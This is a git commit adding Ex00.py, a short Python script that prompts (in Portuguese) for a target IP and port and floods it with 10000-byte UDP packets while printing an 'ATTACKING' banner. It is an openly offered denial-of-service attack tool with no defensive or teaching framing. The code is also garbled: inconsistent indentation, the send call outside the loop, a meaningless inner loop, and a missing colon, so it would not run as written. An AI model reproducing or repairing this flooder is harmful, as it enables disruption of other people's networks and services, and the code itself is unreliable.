c942b0430e7fd81f14f1e7461626e12a787c38d1
syxz404 <123751548+syxz404@users.noreply.github.com>
2023-01-27 12:31:03 -0300

    Create Ex00.py

---
+++ Ex00.py
@@ -0,0 +1,18 @@
+import os, time, socket, random
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(10000)
+timeout = time.time ()
+
+ip = input ("digite o ip:")
+port = int(input("digite a porta:"))
+
+while True:
+       while 1:
+              if time.time() > timeout:
+                  break
+           else:
+                  pass
+sock.sendto(bytes, (ip, port))
+print (" ( + ) ATTACKING SEND BY SYXZ - ")
+if port == 6500
+  port = 1
